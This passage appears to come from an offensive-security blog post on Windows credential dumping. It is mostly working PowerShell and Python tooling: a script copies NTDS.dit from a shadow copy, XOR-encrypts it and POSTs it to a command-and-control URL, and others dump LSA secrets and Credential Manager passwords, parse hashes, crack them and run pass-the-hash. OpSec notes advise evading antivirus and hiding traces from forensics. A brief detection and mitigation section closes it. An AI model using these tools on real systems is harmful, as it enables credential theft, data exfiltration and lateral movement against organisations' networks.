    $result = $class.Create("C:\", "ClientAccessible")

    if ($result.ReturnValue -ne 0) {
        Write-Warning "[-] VSS creation failed (code $($result.ReturnValue))"
        return $null
    }

    $shadowID   = $result.ShadowID
    $shadowCopy = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $shadowID }
    $devicePath = $shadowCopy.DeviceObject + "\"

    Write-Host "[+] shadow copy: $devicePath" -ForegroundColor Green
    return $devicePath
}

function Copy-FromShadow([string]$shadowPath) {
    # create symbolic link to shadow copy for easy access
    cmd /c "mklink /d `"$linkPath`" `"$shadowPath`"" | Out-Null
    Write-Host "[*] link: $linkPath → $shadowPath"

    $ntds_src   = "$linkPath\Windows\NTDS\ntds.dit"
    $system_src = "$linkPath\Windows\System32\config\SYSTEM"

    if (Test-Path $ntds_src) {
        Copy-Item $ntds_src   $ntds_out   -Force
        Copy-Item $system_src $system_out -Force
        Write-Host "[+] NTDS.dit  : $ntds_out ($([math]::Round((Get-Item $ntds_out).Length/1MB,1)) MB)"
        Write-Host "[+] SYSTEM    : $system_out"
    } else {
        Write-Warning "[-] NTDS.dit not found — not a DC?"
    }

    # cleanup link
    cmd /c "rmdir `"$linkPath`"" | Out-Null
}

function Encrypt-Files {
    @($ntds_out, $system_out) | Where-Object { Test-Path $_ } | ForEach-Object {
        $raw = [IO.File]::ReadAllBytes($_)
        for ($i = 0; $i -lt $raw.Length; $i++) {
            $raw[$i] = $raw[$i] -bxor ($XorKey + ($i -band 0xff))
        }
        $enc = $_ + ".enc"
        [IO.File]::WriteAllBytes($enc, $raw)
        Remove-Item $_ -Force

        if ($Exfil) {
            $wc = New-Object Net.WebClient
            $wc.Headers.Add("X-File", [IO.Path]::GetFileName($enc))
            $wc.UploadData($C2Url, "POST", $raw)
            Write-Host "[+] exfiltrated: $enc"
        } else {
            Write-Host "[+] encrypted: $enc"
        }
    }
}

function Remove-ShadowAndArtifacts([string]$shadowPath) {
    $id = (Get-WmiObject Win32_ShadowCopy |
           Where-Object { $_.DeviceObject + "\" -eq $shadowPath }).ID
    if ($id) {
        (Get-WmiObject Win32_ShadowCopy -Filter "ID='$id'").Delete()
        Write-Host "[+] shadow copy deleted"
    }
    Remove-Item $ntds_out, $system_out,
                ($ntds_out + ".enc"), ($system_out + ".enc") `
        -Force -ErrorAction SilentlyContinue
}

if ($Cleanup) {
    Remove-Item $ntds_out, $system_out,
                ($ntds_out + ".enc"), ($system_out + ".enc") `
        -Force -ErrorAction SilentlyContinue
    return
}

$shadow = New-ShadowCopy
if ($shadow) {
    Copy-FromShadow $shadow
    Encrypt-Files
    Remove-ShadowAndArtifacts $shadow

    Write-Host "`n[*] parse on Kali:"
    Write-Host "    impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
}
```

---

## Technique 6 — LSA Secrets + Cached Domain Credentials (DCC2)

LSA Secrets live in `HKLM\SECURITY\Policy\Secrets`, inaccessible even to admins directly. But using the same SAM extraction approach (reg save SECURITY) and the SysKey from SYSTEM, you can decrypt them offline with impacket.

Cached Domain Credentials (DCC2 hashes) allow domain users to log in when the DC is unreachable. They're stored here too.

```powershell {linenos=inline}
# Invoke-LSASecretsDump.ps1
# Dumps LSA secrets and DCC2 hashes via registry hive extraction.

param(
    [string]$OutDir = "C:\Windows\Temp",
    [byte]  $XorKey = 0x22
)

$files = @{
    SYSTEM   = "$OutDir\sys.tmp"
    SECURITY = "$OutDir\sec.tmp"
}

# export hives
$files.GetEnumerator() | ForEach-Object {
    Start-Process reg.exe `
        -ArgumentList "save HKLM\$($_.Key) `"$($_.Value)`" /y" `
        -Wait -WindowStyle Hidden | Out-Null
    Write-Host "[+] $($_.Key) → $($_.Value)"
}

# encrypt
$files.Values | ForEach-Object {
    $raw = [IO.File]::ReadAllBytes($_)
    for ($i = 0; $i -lt $raw.Length; $i++) {
        $raw[$i] = $raw[$i] -bxor ($XorKey + ($i -band 0xff))
    }
    [IO.File]::WriteAllBytes($_ + ".enc", $raw)
    Remove-Item $_ -Force
    Write-Host "[+] encrypted: $($_ + '.enc')"
}

Write-Host "`n[*] extract on Kali:"
Write-Host "    impacket-secretsdump -system SYSTEM -security SECURITY LOCAL"
Write-Host ""
Write-Host "    # DCC2 crack (domain cached creds):"
Write-Host "    hashcat -m 2100 dcc2.hash rockyou.txt"
```

---

## Technique 7 — Windows Credential Manager + DPAPI

The Credential Manager stores browser passwords, RDP credentials, and saved network credentials, all encrypted with DPAPI. The DPAPI master key is derived from the user's password and stored in their profile. With the user's session active, decryption is seamless.

```powershell {linenos=inline}
# Invoke-CredManDump.ps1
# Extracts Windows Credential Manager entries using CredEnumerate Win32 API.
# Runs in the context of the logged-in user — no admin required for their own creds.

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Text;

public class CredMan {
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct CREDENTIAL {
        public int     Flags;
        public int     Type;
        public string  TargetName;
        public string  Comment;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public int     CredentialBlobSize;
        public IntPtr  CredentialBlob;
        public int     Persist;
        public int     AttributeCount;
        public IntPtr  Attributes;
        public string  TargetAlias;
        public string  UserName;
    }

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CredEnumerate(
        string filter, int flags, out int count, out IntPtr pCredentials);
    [DllImport("advapi32.dll")] public static extern void CredFree(IntPtr buffer);

    public static List<string[]> DumpAll() {
        var results = new List<string[]>();
        IntPtr pCreds;
        int count;

        if (!CredEnumerate(null, 0, out count, out pCreds)) return results;

        IntPtr cur = pCreds;
        for (int i = 0; i < count; i++) {
            IntPtr pCred = Marshal.ReadIntPtr(cur);
            var cred = Marshal.PtrToStructure<CREDENTIAL>(pCred);

            string pass = "";
            if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero) {
                byte[] blob = new byte[cred.CredentialBlobSize];
                Marshal.Copy(cred.CredentialBlob, blob, 0, cred.CredentialBlobSize);
                // try decode as UTF-16 (most Windows credentials)
                try { pass = Encoding.Unicode.GetString(blob); }
                catch { pass = BitConverter.ToString(blob); }
            }

            results.Add(new string[] {
                cred.TargetName ?? "",
                cred.UserName   ?? "",
                pass,
                cred.Type.ToString()
            });
            cur = IntPtr.Add(cur, IntPtr.Size);
        }
        CredFree(pCreds);
        return results;
    }
}
"@

Write-Host "`n[+] Windows Credential Manager entries:`n"
$creds = [CredMan]::DumpAll()
if ($creds.Count -eq 0) {
    Write-Host "    (none found for current user)"
} else {
    $creds | ForEach-Object {
        Write-Host "  Target  : $_[0]" -ForegroundColor Cyan
        Write-Host "  Username: $_[1]"
        Write-Host "  Password: $_[2]" -ForegroundColor Yellow
        Write-Host "  Type    : $_[3]"
        Write-Host ""
    }
}

# also export DPAPI blobs for offline cracking
$dpapi_path = "$env:APPDATA\Microsoft\Protect"
if (Test-Path $dpapi_path) {
    Write-Host "[*] DPAPI master key location: $dpapi_path"
    Get-ChildItem $dpapi_path -Recurse | ForEach-Object {
        Write-Host "    $($_.FullName)"
    }
    Write-Host ""
    Write-Host "[*] decrypt with:"
    Write-Host "    impacket-dpapi masterkey -file <masterkey> -sid <SID> -password <pass>"
}
```

---

## Tool — Dump Parser & Credential Extractor (Python)

Full offline credential extraction pipeline: decrypts XOR-encrypted dumps, parses SAM hives, and outputs crackable hashes.

```python {linenos=inline}
#!/usr/bin/env python3
# dump_parser.py
# Offline credential extraction tool.
#
# Capabilities:
#   - XOR decrypt encrypted dumps / hives
#   - Parse SAM + SYSTEM hives to extract NTLM hashes (via impacket)
#   - Format hashes for hashcat / john
#   - Parse DCC2 hashes for hashcat -m 2100
#
# Requirements: pip install impacket
#
# Usage:
#   python3 dump_parser.py --decrypt --key 0x4C lsass.enc lsass.dmp
#   python3 dump_parser.py --sam SAM --system SYSTEM [--security SECURITY]
#   python3 dump_parser.py --ntds ntds.dit --system SYSTEM
#   python3 dump_parser.py --format hashcat --out hashes.txt

import argparse
import os
import sys
import struct
import hashlib
from datetime import datetime

try:
    from impacket.examples.secretsdump import (
        LocalOperations, NTDSHashes, SAMHashes, LSASecrets
    )
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False
    print("[!] impacket not installed — install with: pip install impacket", file=sys.stderr)


# ── XOR decrypt ────────────────────────────────────────────────────────────

def rolling_xor_decrypt(data: bytes, key: int) -> bytes:
    return bytes(b ^ ((key + i) & 0xff) for i, b in enumerate(data))


def decrypt_file(in_path: str, out_path: str, key: int) -> bool:
    try:
        with open(in_path, 'rb') as f:
            enc = f.read()
        dec = rolling_xor_decrypt(enc, key)
        with open(out_path, 'wb') as f:
            f.write(dec)
        print(f"[+] decrypted {in_path} → {out_path} ({len(dec)} bytes)")
        return True
    except Exception as e:
        print(f"[-] decrypt failed: {e}", file=sys.stderr)
        return False


# ── SAM hash extraction ─────────────────────────────────────────────────────

def dump_sam(sam_path: str, system_path: str, security_path: str = None,
             fmt: str = 'hashcat') -> list:
    if not HAS_IMPACKET:
        return []

    hashes = []
    print(f"\n[*] parsing SAM: {sam_path}")

    try:
        local_ops   = LocalOperations(system_path)
        boot_key    = local_ops.getBootKey()
        print(f"[*] boot key : {boot_key.hex()}")

        sam_hashes  = SAMHashes(sam_path, boot_key, isRemote=False)
        sam_hashes.dump()

        for entry in sam_hashes._SAMHashes:
            username = entry['username']
            rid      = entry['rid']
            lm       = entry['lmhash'].hex()   if entry['lmhash']   else 'aad3b435b51404eeaad3b435b51404ee'
            ntlm     = entry['nthash'].hex()    if entry['nthash']   else '31d6cfe0d16ae931b73c59d7e0c089c0'

            if fmt == 'hashcat':
                line = f"{username}:{rid}:{lm}:{ntlm}:::"
            elif fmt == 'john':
                line = f"{username}:{ntlm}"
            else:
                line = f"{username} RID={rid} LM={lm} NTLM={ntlm}"

            hashes.append(line)
            print(f"  [HASH] {line}")

        sam_hashes.finish()
    except Exception as e:
        print(f"[-] SAM parse error: {e}", file=sys.stderr)

    if security_path:
        print(f"\n[*] parsing LSA secrets + DCC2: {security_path}")
        try:
            lsa = LSASecrets(security_path, boot_key, None, isRemote=False)
            lsa.dumpCachedHashes()
            lsa.dumpSecrets()
            lsa.finish()
        except Exception as e:
            print(f"[-] LSA error: {e}", file=sys.stderr)

    return hashes


# ── NTDS hash extraction ────────────────────────────────────────────────────

def dump_ntds(ntds_path: str, system_path: str,
              fmt: str = 'hashcat') -> list:
    if not HAS_IMPACKET:
        return []

    hashes = []
    print(f"\n[*] parsing NTDS.dit: {ntds_path}")

    try:
        local_ops = LocalOperations(system_path)
        boot_key  = local_ops.getBootKey()
        print(f"[*] boot key  : {boot_key.hex()}")

        ntds = NTDSHashes(ntds_path, boot_key, isRemote=False,
                          history=False, noLMHash=True)
        ntds.dump()

        # NTDSHashes writes to stdout — in production redirect or monkey-patch
        # For structured output, use the callback interface
        ntds.finish()
    except Exception as e:
        print(f"[-] NTDS parse error: {e}", file=sys.stderr)

    return hashes


# ── hash formatter ──────────────────────────────────────────────────────────

def write_hashes(hashes: list, out_path: str, fmt: str):
    if not hashes:
        print("[*] no hashes to write")
        return

    with open(out_path, 'w') as f:
        for h in hashes:
            f.write(h + '\n')

    print(f"\n[+] {len(hashes)} hashes → {out_path}")

    if fmt == 'hashcat':
        print(f"[*] crack NTLM:  hashcat -m 1000 {out_path} rockyou.txt -r best64.rule")
        print(f"[*] crack NTLMv2: hashcat -m 5600 {out_path} rockyou.txt")
        print(f"[*] crack DCC2:   hashcat -m 2100 {out_path} rockyou.txt")
    elif fmt == 'john':
        print(f"[*] crack:  john --wordlist=rockyou.txt --format=NT {out_path}")


# ── main ────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(description="Offline credential extraction tool")

    # decrypt options
    p.add_argument('--decrypt',       action='store_true')
    p.add_argument('--key',           default='0x4C', help='XOR key hex')
    p.add_argument('--out-suffix',    default='.dec',  help='decrypted file suffix')

    # source options
    p.add_argument('--sam',           metavar='FILE')
    p.add_argument('--system',        metavar='FILE')
    p.add_argument('--security',      metavar='FILE', default=None)
    p.add_argument('--ntds',          metavar='FILE')

    # output options
    p.add_argument('--format',        choices=['hashcat','john','plain'], default='hashcat')
    p.add_argument('--out',           default='hashes.txt')

    # positional: files to decrypt
    p.add_argument('files',           nargs='*')

    args = p.parse_args()
    key  = int(args.key, 16) & 0xff

    # decrypt mode
    if args.decrypt:
        if not args.files:
            p.error("--decrypt requires input files")
        for f in args.files:
            out = os.path.splitext(f)[0] + args.out_suffix
            decrypt_file(f, out, key)
        return

    # SAM dump
    if args.sam and args.system:
        hashes = dump_sam(args.sam, args.system, args.security, args.format)
        write_hashes(hashes, args.out, args.format)
        return

    # NTDS dump
    if args.ntds and args.system:
        hashes = dump_ntds(args.ntds, args.system, args.format)
        write_hashes(hashes, args.out, args.format)
        return

    p.print_help()


if __name__ == '__main__':
    main()
```

---

## Tool — Hash Cracker Helper (Python)

```python {linenos=inline}
#!/usr/bin/env python3
# hash_crack.py
# Orchestrates hashcat / john for common credential dump hash types.
# Generates optimised crack commands and runs them with progress tracking.
#
# Usage:
#   python3 hash_crack.py --hashes hashes.txt --wordlist rockyou.txt
#   python3 hash_crack.py --hashes hashes.txt --type ntlm --rules
#   python3 hash_crack.py --hashes hashes.txt --type dcc2 --wordlist rockyou.txt

import argparse
import subprocess
import os
import sys
import re
from pathlib import Path

HASHCAT_MODES = {
    'ntlm':    1000,
    'ntlmv2':  5600,
    'dcc2':    2100,
    'lm':      3000,
    'md5crypt':500,
    'sha256':  1400,
}

RULE_FILES = [
    '/usr/share/hashcat/rules/best64.rule',
    '/usr/share/hashcat/rules/dive.rule',
    '/usr/share/hashcat/rules/OneRuleToRuleThemAll.rule',
]

def detect_hash_type(hash_file: str) -> str:
    with open(hash_file) as f:
        sample = f.readline().strip()

    # secretsdump format: user:rid:lm:ntlm:::
    if re.match(r'.+:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::', sample, re.I):
        return 'ntlm'
    # DCC2: $DCC2$...
    if sample.startswith('$DCC2$'):
        return 'dcc2'
    # NTLMv2: user::domain:challenge:response
    if sample.count(':') == 5 and len(sample.split(':')[5]) == 64:
        return 'ntlmv2'
    # raw 32-char hex
    if re.match(r'^[0-9a-f]{32}$', sample, re.I):
        return 'ntlm'
    return 'ntlm'  # default

def extract_ntlm(hash_file: str, out_file: str) -> int:
    """Extract NTLM column from secretsdump format for hashcat -m 1000"""
    count = 0
    with open(hash_file) as fi, open(out_file, 'w') as fo:
        for line in fi:
            line = line.strip()
            if not line or line.startswith('#'): continue
            parts = line.split(':')
            if len(parts) >= 4:
                ntlm = parts[3]
                if re.match(r'^[0-9a-f]{32}$', ntlm, re.I) and \
                   ntlm != '31d6cfe0d16ae931b73c59d7e0c089c0':  # skip empty
                    fo.write(ntlm + '\n')
                    count += 1
    return count

def run_hashcat(mode: int, hash_file: str, wordlist: str,
                rules: list = None, extra_args: list = None) -> None:
    cmd = [
        'hashcat',
        '-m', str(mode),
        '-a', '0',                  # wordlist attack
        '--force',
        '--potfile-disable',        # don't skip already-cracked
        '--status', '--status-timer=10',
        hash_file,
        wordlist,
    ]
    if rules:
        for r in rules:
            if os.path.exists(r):
                cmd += ['-r', r]
    if extra_args:
        cmd += extra_args

    print(f"\n[*] running: {' '.join(cmd)}\n")
    try:
        subprocess.run(cmd, check=False)
    except FileNotFoundError:
        print("[-] hashcat not found — install with: sudo apt install hashcat")

def show_cracked(pot_file: str = None) -> None:
    pot = pot_file or os.path.expanduser('~/.hashcat/hashcat.potfile')
    if not os.path.exists(pot):
        print("[*] no potfile found")
        return
    print(f"\n[+] cracked credentials ({pot}):")
    with open(pot) as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                print(f"  HASH: {parts[0][:16]}...  PASS: {parts[1]}")

def main():
    p = argparse.ArgumentParser(description="Hashcat orchestrator for cred dumps")
    p.add_argument('--hashes',    required=True)
    p.add_argument('--wordlist',  default='/usr/share/wordlists/rockyou.txt')
    p.add_argument('--type',
                   choices=list(HASHCAT_MODES.keys()),
                   default=None, help='auto-detect if omitted')
    p.add_argument('--rules',     action='store_true', help='apply best64 rules')
    p.add_argument('--show',      action='store_true', help='show cracked only')
    p.add_argument('--extract',   action='store_true',
                   help='extract NTLM column from secretsdump format first')
    args = p.parse_args()

    if args.show:
        show_cracked()
        return

    hash_type = args.type or detect_hash_type(args.hashes)
    mode      = HASHCAT_MODES[hash_type]
    target    = args.hashes

    print(f"[*] hash type : {hash_type} (mode {mode})")
    print(f"[*] hash file : {args.hashes}")
    print(f"[*] wordlist  : {args.wordlist}")

    if args.extract and hash_type == 'ntlm':
        extracted = args.hashes + '.ntlm'
        n = extract_ntlm(args.hashes, extracted)
        print(f"[*] extracted {n} NTLM hashes → {extracted}")
        target = extracted

    if not os.path.exists(args.wordlist):
        print(f"[-] wordlist not found: {args.wordlist}")
        print("    download: wget https://github.com/brannondorsey/naive-hashcat/"
              "releases/download/data/rockyou.txt")
        sys.exit(1)

    rules = [RULE_FILES[0]] if args.rules else None
    run_hashcat(mode, target, args.wordlist, rules)
    show_cracked()

if __name__ == '__main__':
    main()
```

```bash {linenos=inline}
# full pipeline
# 1. decrypt dump
python3 dump_parser.py --decrypt --key 0x4C lsass.enc

# 2. parse SAM hashes
python3 dump_parser.py --sam SAM --system SYSTEM --security SECURITY \
    --format hashcat --out hashes.txt

# 3. crack
python3 hash_crack.py --hashes hashes.txt --wordlist rockyou.txt \
    --extract --rules

# 4. pass-the-hash with cracked / raw NTLM
impacket-psexec -hashes :a<ntlm_hash> Administrator@10.10.10.10
impacket-wmiexec -hashes :a<ntlm_hash> Administrator@10.10.10.10
```

---

## OpSec Notes

``` {linenos=inline}
┌─────────────────────────────────────────────────────────────────────┐
│                     NOISE LEVEL BY TECHNIQUE                        │
├──────────────────────┬────────────────┬────────────────────────────┤
│ Technique            │ Noise Level    │ Primary Detection Signal   │
├──────────────────────┼────────────────┼────────────────────────────┤
│ comsvcs.dll MiniDump │ HIGH           │ rundll32 → comsvcs.dll     │
│                      │                │ touching lsass handle      │
├──────────────────────┼────────────────┼────────────────────────────┤
│ Custom Dumper        │ MEDIUM         │ OpenProcess(lsass) EID 10  │
│ (lsass_dump.exe)     │                │ MiniDumpWriteDump call     │
├──────────────────────┼────────────────┼────────────────────────────┤
│ Handle Duplication   │ LOW            │ No direct OpenProcess,     │
│                      │                │ DuplicateHandle from       │
│                      │                │ trusted process            │
├──────────────────────┼────────────────┼────────────────────────────┤
│ SAM / hive reg save  │ MEDIUM         │ reg.exe saving hives,      │
│                      │                │ SAM file creation          │
├──────────────────────┼────────────────┼────────────────────────────┤
│ NTDS via VSS         │ MEDIUM-LOW     │ VSS creation event,        │
│                      │                │ ntds.dit file access       │
├──────────────────────┼────────────────┼────────────────────────────┤
│ Credential Manager   │ LOW            │ CredEnumerate API call     │
│                      │                │ (user-context only)        │
└──────────────────────┴────────────────┴────────────────────────────┘
```

- **Encrypt every dump before it hits disk.** The XOR-on-write callback in `lsass_dump.c` means the plaintext MiniDump never exists as a file. Only the encrypted version is written. This defeats file-based AV scanning.
- **Exfiltrate over HTTPS.** HTTP POST of a dump is a large anomalous upload. Use HTTPS with a clean domain, or chunk into smaller requests to blend with normal traffic.
- **The dump file name matters.** `lsass.dmp` is a hard Defender signature. Use random extensions: `.tmp`, `.log`, `.dat`, names matching existing system files in the same directory.
- **PPL (Protected Process Light)** blocks `OpenProcess` on LSASS when Credential Guard is active. Handle duplication is your best bet. Kernel-level techniques (driver-based) are beyond this post's scope but exist.
- **Timing matters for VSS.** On DCs with heavy AD activity, VSS snapshots can lag. Create the snapshot, extract immediately, and delete. Don't leave shadows around for forensics to find.

---

## Detection (Blue Team)

| signal | event |
|--------|-------|
| `OpenProcess` targeting LSASS | Sysmon EID 10 — SourceImage + TargetImage = lsass.exe |
| `rundll32.exe` loading `comsvcs.dll` | Sysmon EID 7 — ImageLoad |
| `MiniDumpWriteDump` called against LSASS | ETW — Microsoft-Windows-Threat-Intelligence |
| `reg.exe save HKLM\SAM` | Sysmon EID 1 — CommandLine |
| VSS shadow copy creation | Windows EID 7036 — VSS service + WMI |
| Large file write to Temp | Sysmon EID 11 — FileCreate, size anomaly |
| NTLM hash used in Pass-the-Hash | Security EID 4624 — LogonType=3 + NTLM |
| `CredEnumerate` called | ETW — Microsoft-Windows-Security-Auditing |

**PowerShell hunt — find lsass access events:**

```powershell {linenos=inline}
# Hunt-LSASSAccess.ps1
Get-WinEvent -FilterHashtable @{
    LogName = "Microsoft-Windows-Sysmon/Operational"
    Id      = 10   # ProcessAccess
} -MaxEvents 1000 -ErrorAction SilentlyContinue |
Where-Object {
    $_.Message -match "lsass\.exe" -and
    $_.Message -match "TargetImage"
} |
Select-Object TimeCreated,
    @{N="Source";E={ ($_.Message | Select-String "SourceImage: (.+)").Matches[0].Groups[1].Value }},
    @{N="Access"; E={ ($_.Message | Select-String "GrantedAccess: (.+)").Matches[0].Groups[1].Value }} |
Format-Table -AutoSize
```

**Mitigation stack:**

```powershell {linenos=inline}
# Enable Credential Guard (blocks WDigest, encrypts NTLM in LSASS)
# Requires UEFI Secure Boot + TPM 2.0
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard"
Set-ItemProperty $regPath "EnableVirtualizationBasedSecurity" 1
Set-ItemProperty $regPath "RequirePlatformSecurityFeatures"   1

# Enable RunAsPPL — protects LSASS as Protected Process Light
Set-ItemProperty `
    "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    "RunAsPPL" 1

# Disable WDigest plaintext caching
Set-ItemProperty `
    "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
    "UseLogonCredential" 0

# Block reg.exe from saving SAM/SYSTEM hives via AppLocker
# (DLL Rules must be enabled)
```

---

## MITRE ATT&CK

| technique | ID | description |
|-----------|----|-------------|
| OS Credential Dumping | T1003 | Parent technique |
| LSASS Memory | T1003.001 | comsvcs MiniDump, custom dumper, handle dup |
| Security Account Manager | T1003.002 | SAM hive extraction |
| NTDS | T1003.003 | ntds.dit via VSS on DC |
| LSA Secrets | T1003.004 | SECURITY hive + LSA decryption |
| Cached Domain Credentials | T1003.005 | DCC2 hash extraction |
| Credentials from Password Stores | T1555 | Credential Manager |
| Windows Credential Manager | T1555.004 | CredEnumerate API |
| Defense Evasion | TA0005 | Encrypted dumps, LOLBin delivery |
| Credential Access | TA0006 | Primary tactic |
| Lateral Movement | TA0008 | Pass-the-Hash, Pass-the-Ticket |

---

## References

- [MITRE ATT&CK T1003 — OS Credential Dumping](https://attack.mitre.org/techniques/T1003/)
- [MITRE ATT&CK T1003.001 — LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- [MITRE ATT&CK T1003.003 — NTDS](https://attack.mitre.org/techniques/T1003/003/)
- Benjamin Delpy — Mimikatz research
- [impacket — secretsdump](https://github.com/fortra/impacket)
- [pypykatz — pure Python Mimikatz](https://github.com/skelsec/pypykatz)
- Skelsec — LSASS parsing research
- [Cobalt Strike — credential dumping TTPs](https://cobaltstrike.com)
- [ired.team — credential dumping notes](https://ired.team)
- Microsoft — Credential Guard documentation
- [LOLBAS — comsvcs.dll](https://lolbas-project.github.io/)
- [PayloadsAllTheThings — credential dumping](https://github.com/swisskyrepo/PayloadsAllTheThings)
